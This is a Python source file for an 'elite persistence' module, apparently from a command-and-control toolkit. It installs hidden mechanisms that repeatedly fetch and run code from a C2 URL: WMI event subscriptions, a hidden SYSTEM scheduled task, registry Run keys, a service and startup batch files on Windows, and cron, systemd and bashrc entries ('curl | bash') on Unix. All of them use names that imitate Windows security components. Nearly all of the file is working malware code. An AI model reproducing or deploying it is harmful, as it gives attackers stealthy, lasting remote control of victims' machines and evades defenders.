#!/usr/bin/env python3
"""
Elite Persistence Command Implementation
Advanced persistence mechanisms using WMI, Registry, and Scheduled Tasks
"""

import os
import sys
import time
import tempfile
import subprocess
from typing import Dict, Any, List

def elite_persistence(methods: List[str] = None, payload_url: str = None) -> Dict[str, Any]:
    """
    Elite persistence installation with advanced features:
    - WMI Event Subscriptions (most stealthy)
    - Hidden Scheduled Tasks
    - Registry Run Keys (obfuscated)
    - Windows Services (if admin)
    - Startup folder persistence
    - Multiple simultaneous methods
    """
    
    try:
        if sys.platform != 'win32':
            return _unix_persistence(methods, payload_url)
        
        # Default methods if none specified
        if not methods:
            methods = ['wmi', 'registry', 'scheduled_task']
        
        # Default payload URL
        if not payload_url:
            payload_url = "http://c2.server.com/payload"
        
        installed_methods = []
        failed_methods = []
        
        # Install each persistence method
        for method in methods:
            try:
                if method == 'wmi':
                    if _install_wmi_persistence(payload_url):
                        installed_methods.append("WMI Event Subscription")
                    else:
                        failed_methods.append("WMI Event Subscription")
                
                elif method == 'scheduled_task':
                    if _install_scheduled_task_persistence(payload_url):
                        installed_methods.append("Hidden Scheduled Task")
                    else:
                        failed_methods.append("Hidden Scheduled Task")
                
                elif method == 'registry':
                    if _install_registry_persistence(payload_url):
                        installed_methods.append("Registry Run Key")
                    else:
                        failed_methods.append("Registry Run Key")
                
                elif method == 'service':
                    if _is_admin() and _install_service_persistence(payload_url):
                        installed_methods.append("Windows Service")
                    else:
                        failed_methods.append("Windows Service (requires admin)")
                
                elif method == 'startup':
                    if _install_startup_persistence(payload_url):
                        installed_methods.append("Startup Folder")
                    else:
                        failed_methods.append("Startup Folder")
                
                else:
                    failed_methods.append(f"Unknown method: {method}")
            
            except Exception as e:
                failed_methods.append(f"{method} (error: {str(e)[:30]})")
        
        return {
            "success": len(installed_methods) > 0,
            "installed": installed_methods,
            "failed": failed_methods,
            "total_methods": len(methods),
            "successful_methods": len(installed_methods),
            "payload_url": payload_url,
            "warning": "Persistence installed for security research purposes only"
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": f"Persistence installation failed: {str(e)}",
            "installed": [],
            "failed": methods or []
        }

def _is_admin() -> bool:
    """Check if running with administrator privileges"""
    try:
        if sys.platform == 'win32':
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except:
        return False

def _install_wmi_persistence(payload_url: str) -> bool:
    """Install WMI event subscription persistence (most stealthy)"""
    
    try:
        import win32com.client
        
        # Connect to WMI
        wmi = win32com.client.GetObject("winmgmts:")
        
        # Create Event Filter (triggers on system events)
        event_filter = wmi.Get("__EventFilter").SpawnInstance_()
        event_filter.Name = "SystemPerformanceMonitor"
        event_filter.QueryLanguage = "WQL"
        event_filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
        event_filter.Put_()
        
        # Create Command Line Consumer
        consumer = wmi.Get("CommandLineEventConsumer").SpawnInstance_()
        consumer.Name = "SystemPerformanceLogger"
        consumer.CommandLineTemplate = f'powershell.exe -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString(\'{payload_url}\')"'
        consumer.Put_()
        
        # Bind filter to consumer
        binding = wmi.Get("__FilterToConsumerBinding").SpawnInstance_()
        binding.Filter = event_filter.Path_.Path
        binding.Consumer = consumer.Path_.Path
        binding.Put_()
        
        return True
    
    except ImportError:
        # Try alternative method without win32com
        return _install_wmi_persistence_alternative(payload_url)
    except Exception:
        return False

def _install_wmi_persistence_alternative(payload_url: str) -> bool:
    """Alternative WMI persistence using wmic command"""
    
    try:
        # Create WMI event filter using wmic
        filter_cmd = [
            'wmic', '/namespace:\\\\root\\subscription', 'PATH', '__EventFilter',
            'CREATE', 'Name="SystemPerformanceMonitor"',
            'EventNameSpace="root\\cimv2"',
            'QueryLanguage="WQL"',
            'Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_LocalTime\'"'
        ]
        
        result = subprocess.run(filter_cmd, capture_output=True, text=True, timeout=30)
        if result.returncode != 0:
            return False
        
        # Create command line consumer
        consumer_cmd = [
            'wmic', '/namespace:\\\\root\\subscription', 'PATH', 'CommandLineEventConsumer',
            'CREATE', 'Name="SystemPerformanceLogger"',
            f'CommandLineTemplate="powershell.exe -WindowStyle Hidden -Command \\"IEX(New-Object Net.WebClient).DownloadString(\'{payload_url}\')\\""'
        ]
        
        result = subprocess.run(consumer_cmd, capture_output=True, text=True, timeout=30)
        if result.returncode != 0:
            return False
        
        # Bind filter to consumer
        binding_cmd = [
            'wmic', '/namespace:\\\\root\\subscription', 'PATH', '__FilterToConsumerBinding',
            'CREATE', 'Filter="__EventFilter.Name=\\"SystemPerformanceMonitor\\""',
            'Consumer="CommandLineEventConsumer.Name=\\"SystemPerformanceLogger\\""'
        ]
        
        result = subprocess.run(binding_cmd, capture_output=True, text=True, timeout=30)
        return result.returncode == 0
    
    except Exception:
        return False

def _install_scheduled_task_persistence(payload_url: str) -> bool:
    """Install hidden scheduled task persistence"""
    
    try:
        # Create task XML with obfuscated name
        task_name = "\\Microsoft\\Windows\\AppID\\PolicyConverter"
        
        task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
        <Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
          <Settings>
            <Hidden>true</Hidden>
            <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
            <WakeToRun>false</WakeToRun>
            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
            <AllowHardTerminate>true</AllowHardTerminate>
            <StartWhenAvailable>true</StartWhenAvailable>
            <RunOnlyIfIdle>false</RunOnlyIfIdle>
            <IdleSettings>
              <StopOnIdleEnd>false</StopOnIdleEnd>
              <RestartOnIdle>false</RestartOnIdle>
            </IdleSettings>
            <AllowStartOnDemand>true</AllowStartOnDemand>
            <Enabled>true</Enabled>
            <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
            <Priority>7</Priority>
          </Settings>
          <Triggers>
            <LogonTrigger>
              <Enabled>true</Enabled>
            </LogonTrigger>
            <TimeTrigger>
              <Enabled>true</Enabled>
              <Repetition>
                <Interval>PT30M</Interval>
              </Repetition>
              <StartBoundary>2025-01-01T00:00:00</StartBoundary>
            </TimeTrigger>
          </Triggers>
          <Actions>
            <Exec>
              <Command>powershell.exe</Command>
              <Arguments>-WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('{payload_url}')"</Arguments>
            </Exec>
          </Actions>
          <Principals>
            <Principal>
              <UserId>S-1-5-18</UserId>
              <RunLevel>HighestAvailable</RunLevel>
            </Principal>
          </Principals>
        </Task>'''
        
        # Save XML to temporary file
        temp_xml = tempfile.mktemp(suffix='.xml')
        with open(temp_xml, 'w', encoding='utf-16') as f:
            f.write(task_xml)
        
        try:
            # Create task using schtasks
            result = subprocess.run([
                'schtasks', '/create', '/tn', task_name, 
                '/xml', temp_xml, '/f'
            ], capture_output=True, text=True, timeout=30)
            
            return result.returncode == 0
        
        finally:
            # Clean up XML file
            try:
                os.remove(temp_xml)
            except:
                pass
    
    except Exception:
        return False

def _install_registry_persistence(payload_url: str) -> bool:
    """Install registry run key persistence with obfuscation"""
    
    try:
        import winreg
        
        # Multiple registry locations for redundancy
        registry_locations = [
            (winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce")
        ]
        
        success_count = 0
        
        for hkey, subkey_path in registry_locations:
            try:
                # Open registry key
                key = winreg.OpenKey(hkey, subkey_path, 0, winreg.KEY_SET_VALUE)
                
                # Create obfuscated entry name
                entry_name = "SecurityHealthSystray"
                
                # Create PowerShell command
                ps_command = f'powershell.exe -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString(\'{payload_url}\')"'
                
                # Set registry value
                winreg.SetValueEx(key, entry_name, 0, winreg.REG_SZ, ps_command)
                winreg.CloseKey(key)
                
                success_count += 1
            
            except Exception:
                continue
        
        return success_count > 0
    
    except Exception:
        return False

def _install_service_persistence(payload_url: str) -> bool:
    """Install Windows service persistence (requires admin)"""
    
    try:
        if not _is_admin():
            return False
        
        # Create service using sc command
        service_name = "SecurityHealthService"
        service_display = "Windows Security Health Service"
        
        # Create PowerShell script for service
        ps_script = f'''
        while ($true) {{
            try {{
                IEX(New-Object Net.WebClient).DownloadString('{payload_url}')
            }} catch {{}}
            Start-Sleep -Seconds 300  # 5 minutes
        }}
        '''
        
        # Save script to system directory
        script_path = os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32', 'SecurityHealth.ps1')
        
        try:
            with open(script_path, 'w') as f:
                f.write(ps_script)
        except:
            return False
        
        # Create service
        service_cmd = [
            'sc', 'create', service_name,
            'binPath=', f'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "{script_path}"',
            'DisplayName=', service_display,
            'start=', 'auto'
        ]
        
        result = subprocess.run(service_cmd, capture_output=True, text=True, timeout=30)
        
        if result.returncode == 0:
            # Start the service
            start_result = subprocess.run(
                ['sc', 'start', service_name],
                capture_output=True, text=True, timeout=30
            )
            return start_result.returncode == 0
        
        return False
    
    except Exception:
        return False

def _install_startup_persistence(payload_url: str) -> bool:
    """Install startup folder persistence"""
    
    try:
        # Get startup folder paths
        startup_folders = [
            os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
            os.path.join(os.environ.get('ALLUSERSPROFILE', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        ]
        
        success_count = 0
        
        for startup_folder in startup_folders:
            if os.path.exists(startup_folder) and os.access(startup_folder, os.W_OK):
                try:
                    # Create batch file
                    batch_file = os.path.join(startup_folder, 'SecurityUpdate.bat')
                    
                    batch_content = f'''@echo off
powershell.exe -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('{payload_url}')"
'''
                    
                    with open(batch_file, 'w') as f:
                        f.write(batch_content)
                    
                    # Hide the file
                    try:
                        import subprocess
                        subprocess.run(['attrib', '+H', batch_file], capture_output=True, timeout=5)
                    except:
                        pass
                    
                    success_count += 1
                
                except Exception:
                    continue
        
        return success_count > 0
    
    except Exception:
        return False

def _unix_persistence(methods: List[str], payload_url: str) -> Dict[str, Any]:
    """Install Unix persistence mechanisms"""
    
    if not methods:
        methods = ['cron', 'systemd', 'bashrc']
    
    if not payload_url:
        payload_url = "http://c2.server.com/payload"
    
    installed_methods = []
    failed_methods = []
    
    for method in methods:
        try:
            if method == 'cron':
                if _install_cron_persistence(payload_url):
                    installed_methods.append("Cron Job")
                else:
                    failed_methods.append("Cron Job")
            
            elif method == 'systemd':
                if _install_systemd_persistence(payload_url):
                    installed_methods.append("Systemd Service")
                else:
                    failed_methods.append("Systemd Service")
            
            elif method == 'bashrc':
                if _install_bashrc_persistence(payload_url):
                    installed_methods.append("Bash Profile")
                else:
                    failed_methods.append("Bash Profile")
            
            else:
                failed_methods.append(f"Unknown method: {method}")
        
        except Exception as e:
            failed_methods.append(f"{method} (error: {str(e)[:30]})")
    
    return {
        "success": len(installed_methods) > 0,
        "installed": installed_methods,
        "failed": failed_methods,
        "total_methods": len(methods),
        "successful_methods": len(installed_methods),
        "payload_url": payload_url
    }

def _install_cron_persistence(payload_url: str) -> bool:
    """Install cron job persistence"""
    
    try:
        # Get current crontab
        result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
        current_cron = result.stdout if result.returncode == 0 else ""
        
        # Add our cron job
        cron_job = f"*/30 * * * * curl -s {payload_url} | bash\n"
        
        # Check if already exists
        if cron_job.strip() in current_cron:
            return True
        
        # Add new cron job
        new_cron = current_cron + cron_job
        
        # Install new crontab
        process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
        process.communicate(input=new_cron)
        
        return process.returncode == 0
    
    except Exception:
        return False

def _install_systemd_persistence(payload_url: str) -> bool:
    """Install systemd service persistence"""
    
    try:
        service_content = f'''[Unit]
Description=System Security Monitor
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "curl -s {payload_url} | bash"
Restart=always
RestartSec=300
User=root

[Install]
WantedBy=multi-user.target
'''
        
        service_file = "/etc/systemd/system/security-monitor.service"
        
        # Write service file (requires root)
        with open(service_file, 'w') as f:
            f.write(service_content)
        
        # Enable and start service
        subprocess.run(['systemctl', 'daemon-reload'], timeout=10)
        subprocess.run(['systemctl', 'enable', 'security-monitor'], timeout=10)
        subprocess.run(['systemctl', 'start', 'security-monitor'], timeout=10)
        
        return True
    
    except Exception:
        return False

def _install_bashrc_persistence(payload_url: str) -> bool:
    """Install bash profile persistence"""
    
    try:
        home_dir = os.path.expanduser("~")
        bashrc_files = [
            os.path.join(home_dir, '.bashrc'),
            os.path.join(home_dir, '.bash_profile'),
            os.path.join(home_dir, '.profile')
        ]
        
        persistence_line = f'curl -s {payload_url} | bash &'
        
        success_count = 0
        
        for bashrc_file in bashrc_files:
            try:
                if os.path.exists(bashrc_file):
                    # Check if already exists
                    with open(bashrc_file, 'r') as f:
                        content = f.read()
                    
                    if persistence_line not in content:
                        # Add persistence line
                        with open(bashrc_file, 'a') as f:
                            f.write(f'\n# System security check\n{persistence_line}\n')
                        
                        success_count += 1
            
            except Exception:
                continue
        
        return success_count > 0
    
    except Exception:
        return False

def elite_unpersistence() -> Dict[str, Any]:
    """Remove all installed persistence mechanisms"""
    
    try:
        removed_methods = []
        failed_removals = []
        
        if sys.platform == 'win32':
            # Remove WMI persistence
            if _remove_wmi_persistence():
                removed_methods.append("WMI Event Subscription")
            else:
                failed_removals.append("WMI Event Subscription")
            
            # Remove scheduled task
            if _remove_scheduled_task_persistence():
                removed_methods.append("Scheduled Task")
            else:
                failed_removals.append("Scheduled Task")
            
            # Remove registry entries
            if _remove_registry_persistence():
                removed_methods.append("Registry Run Keys")
            else:
                failed_removals.append("Registry Run Keys")
        
        else:
            # Remove Unix persistence
            if _remove_cron_persistence():
                removed_methods.append("Cron Jobs")
            else:
                failed_removals.append("Cron Jobs")
            
            if _remove_bashrc_persistence():
                removed_methods.append("Bash Profile")
            else:
                failed_removals.append("Bash Profile")
        
        return {
            "success": len(removed_methods) > 0,
            "removed": removed_methods,
            "failed": failed_removals,
            "total_removed": len(removed_methods)
        }
    
    except Exception as e:
        return {
            "success": False,
            "error": f"Persistence removal failed: {str(e)}",
            "removed": [],
            "failed": []
        }

def _remove_wmi_persistence() -> bool:
    """Remove WMI event subscription persistence"""
    
    try:
        # Remove using wmic commands
        commands = [
            ['wmic', '/namespace:\\\\root\\subscription', 'PATH', '__FilterToConsumerBinding', 
             'WHERE', 'Filter="__EventFilter.Name=\'SystemPerformanceMonitor\'"', 'DELETE'],
            ['wmic', '/namespace:\\\\root\\subscription', 'PATH', 'CommandLineEventConsumer', 
             'WHERE', 'Name="SystemPerformanceLogger"', 'DELETE'],
            ['wmic', '/namespace:\\\\root\\subscription', 'PATH', '__EventFilter', 
             'WHERE', 'Name="SystemPerformanceMonitor"', 'DELETE']
        ]
        
        success_count = 0
        for cmd in commands:
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    success_count += 1
            except:
                continue
        
        return success_count > 0
    
    except Exception:
        return False

def _remove_scheduled_task_persistence() -> bool:
    """Remove scheduled task persistence"""
    
    try:
        result = subprocess.run([
            'schtasks', '/delete', '/tn', '\\Microsoft\\Windows\\AppID\\PolicyConverter', '/f'
        ], capture_output=True, text=True, timeout=10)
        
        return result.returncode == 0
    
    except Exception:
        return False

def _remove_registry_persistence() -> bool:
    """Remove registry persistence entries"""
    
    try:
        import winreg
        
        registry_locations = [
            (winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce")
        ]
        
        success_count = 0
        entry_name = "SecurityHealthSystray"
        
        for hkey, subkey_path in registry_locations:
            try:
                key = winreg.OpenKey(hkey, subkey_path, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, entry_name)
                winreg.CloseKey(key)
                success_count += 1
            except FileNotFoundError:
                # Entry doesn't exist, which is fine
                success_count += 1
            except Exception:
                continue
        
        return success_count > 0
    
    except Exception:
        return False

def _remove_cron_persistence() -> bool:
    """Remove cron job persistence"""
    
    try:
        # Get current crontab
        result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
        if result.returncode != 0:
            return True  # No crontab exists
        
        current_cron = result.stdout
        
        # Remove our cron jobs
        lines = current_cron.split('\n')
        filtered_lines = []
        
        for line in lines:
            if 'curl -s http://c2.server.com/payload' not in line:
                filtered_lines.append(line)
        
        # Install filtered crontab
        new_cron = '\n'.join(filtered_lines)
        
        process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
        process.communicate(input=new_cron)
        
        return process.returncode == 0
    
    except Exception:
        return False

def _remove_bashrc_persistence() -> bool:
    """Remove bash profile persistence"""
    
    try:
        home_dir = os.path.expanduser("~")
        bashrc_files = [
            os.path.join(home_dir, '.bashrc'),
            os.path.join(home_dir, '.bash_profile'),
            os.path.join(home_dir, '.profile')
        ]
        
        success_count = 0
        
        for bashrc_file in bashrc_files:
            try:
                if os.path.exists(bashrc_file):
                    with open(bashrc_file, 'r') as f:
                        lines = f.readlines()
                    
                    # Filter out persistence lines
                    filtered_lines = []
                    for line in lines:
                        if 'curl -s http://c2.server.com/payload' not in line:
                            filtered_lines.append(line)
                    
                    # Write back filtered content
                    with open(bashrc_file, 'w') as f:
                        f.writelines(filtered_lines)
                    
                    success_count += 1
            
            except Exception:
                continue
        
        return success_count > 0
    
    except Exception:
        return False


if __name__ == "__main__":
    # Test the elite persistence command
    print("Testing Elite Persistence Command...")
    
    # Test persistence installation
    result = elite_persistence(methods=['registry', 'startup'], payload_url="http://test.example.com/payload")
    
    if result['success']:
        print(f"✅ Persistence installation successful!")
        print(f"Methods installed: {result['installed']}")
        print(f"Methods failed: {result['failed']}")
        print(f"Success rate: {result['successful_methods']}/{result['total_methods']}")
        
        # Test removal
        print("\nTesting persistence removal...")
        removal_result = elite_unpersistence()
        
        if removal_result['success']:
            print(f"✅ Persistence removal successful!")
            print(f"Methods removed: {removal_result['removed']}")
        else:
            print(f"⚠️ Persistence removal issues: {removal_result.get('error', 'Unknown')}")
    
    else:
        print(f"❌ Persistence installation failed: {result['error']}")
    
    print("Elite Persistence command test complete")